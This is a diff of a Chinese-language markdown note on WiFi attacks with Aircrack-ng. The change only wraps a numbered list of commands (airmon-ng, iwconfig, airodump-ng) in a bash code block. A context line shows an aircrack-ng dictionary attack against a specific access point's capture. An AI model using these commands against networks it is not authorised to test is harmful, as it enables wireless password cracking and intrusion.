@@ -43,9 +43,11 @@ aircrack-ng -w top100.txt -M 100 -f 80 -1 -a 2 -b 0c:5c:b5:c8:04:eb /tmp/airport
 
 
 
-使用Aircrack-ng工具，依次输入以下命令
-防止设备繁忙
-1.airmon-ng check kill
+使用Aircrack-ng工具，依次输入以下命令  
+
+```bash
+# 防止设备繁忙  
+1.airmon-ng check kill  
 查看无线网卡状态
 2.ifconfig/iwconfig -a
 加载无线网卡，已加载则忽略
@@ -54,7 +56,7 @@ aircrack-ng -w top100.txt -M 100 -f 80 -1 -a 2 -b 0c:5c:b5:c8:04:eb /tmp/airport
 4.airmon-ng start wlan0
 探测无线网络
 5.airodump-ng mon0
-
+```
 
 参考  
 - [WiFi 安全与攻击案例分析](https://paper.seebug.org/1159/)
